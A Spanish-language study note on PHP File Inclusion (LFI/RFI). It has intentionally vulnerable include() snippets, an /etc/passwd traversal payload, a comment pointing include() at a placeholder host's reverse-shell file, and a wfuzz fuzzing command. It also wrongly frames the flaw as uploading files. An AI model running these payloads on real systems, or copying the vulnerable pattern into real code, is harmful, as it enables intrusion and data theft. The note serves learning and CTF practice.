# ¿Qué es File Inclusion?
El File Inclusion ("inclusión" de archivos) es una vulnerabilidad mayormente encontrada en aplicaciones web desarrolladas con PHP, la cual, debido a una falta de sanitización adecuada permite a los atacantes incluir$^1$ archivos, dando pie a ataques como RCE, robo de datos o defacement.
> `include` es una función de PHP que incluye el contenido de otro archivo dentro del script actual, se utiliza para reutilizar código, modularizar y separar lógica de presentación. Sin embargo, cuando el nombre del archivo a incluir es un input del usuario y la validación de este input es insuficiente, surge la vulnerabilidad en cuestión. Esto es un ejemplo del código que la hace posible:
```php
  <?php
$page = $_GET['page']; // Esta variable viene dada de un input del usuario
include($page . '.php'); // ¡PELIGRO!
?>
```

Esta vulnerabilidad puede ser confundida a menudo con [[Path Trasversal]] debido a que esta también permite la lectura no autorizada de archivos en el sistema. A menudo se dan a la vez y hallar una vulnerabilidad de Path Trasversal puede ser un medio mediante el cual vulnerar con File Inclusion, sin embargo no siempre es así.
Mientras que Path Trasversal se centra en manipular el path del sistema (en el contexto de los directorios) para la lectura, en File Inclusion lo que queremos es **subir** archivos al sistema.

Dentro de lo que es el File Inclusion se puede clasificar la vulnerabilidad según su lógica y funcionamiento en dos: RFI (Remote File Inclusion o "Inclusión" Remota de Archivos) y LFI (Local File Inclusion o "Inclusión Local de Archivos")
## LFI
Una vulnerabilidad Local File Inclusion explota una aplicación que incluye archivos. Si esta inclusión no está correctamente sanitizada como en el ejemplo de script más arriba, podemos modificar los parámetros de búsqueda para `include` nos sirva archivos que no deberíamos poder ver, por ejemplo, `/etc/passwd`:
```
http://example.com/index.php?page=../../../etc/passwd
```
Esto le da al atacante la capacidad de leer archivos internos, pudiendo llevar a la exfiltración de documentos o información sensible, más gravemente aún, si la página en cuestión permite la subida de archivos no sanitizada, podríamos, por ejemplo, subir una reverse shell y accederla abusando `include`. 
### LFI to RCE
A veces, es posible emplear un LFI para lograr la ejecución de código remoto a través de distintos métodos.

Utilizando el script citado abajo #FilterChainGenerator se puede llegar a ejecutar código.
## RFI
El funcionamiento de RFI es muy similar en lógica al LFI, la diferencia se da cuando una aplicación permite la inclusión de archivos remotos, normalmente a través de input del usuario, en este caso, en lugar de buscar un lugar desde el cual subir archivos para accederlos después, podríamos subir directamente la revshell con un servidor malicioso o incluso nuestra propia máquina (EXTREMADAMENTE RASTREABLE, SOLO CON PERMISO O EN CTFS)
```php
<?php

$templateUrl = $_POST[‘template_url’]; // En este ejemplo el código permite el fetch de archivos externos para customizar un blog 
include($templateUrl); // En caso de tener un servidor malicioso podríamos usar esta URL http://100.000.00.00/revshell.php

?>
```

### Recursos
[RFI/LFI Payload list](https://github.com/payloadbox/rfi-lfi-payload-list)
[PHP Filter Chain Generator](https://github.com/synacktiv/php_filter_chain_generator) #FilterChainGenerator
[Writeup d1se0 para entender LFI to RCE](https://dise0.gitbook.io/h4cker_b00k/ctf/ctfs/ctf-forbiddenhack-easy)
[Muy buen vídeo](https://youtu.be/1WIVW1d37kz)
### Cheats
```
wfuzz -t 200 -L --hc 404 -w <Diccionario de parametros> -w <Diccionario de Payloads LFI> -u "http://example.com/file.php?FUZZ=FUZ2Z"
```
Ejemplo de comando para buscar vulnerabilidades LFI mediante fuzzing, harán falta dos diccionarios por los que iterar para parámetros y payloads  
### Artículos / fuentes
[Indusface](https://www.indusface.com/learning/file-inclusion-attacks-lfi-rfi/)
[Payloads all the things](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)
[Bypasses para FI de PATT](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#null-byte)
[DeepHacking](https://deephacking.tech/local-file-inclusion-lfi-web/#proc-self-fd-o-dev-fd)
[xerosec](https://youtu.be/8r1HQVZZ6hU)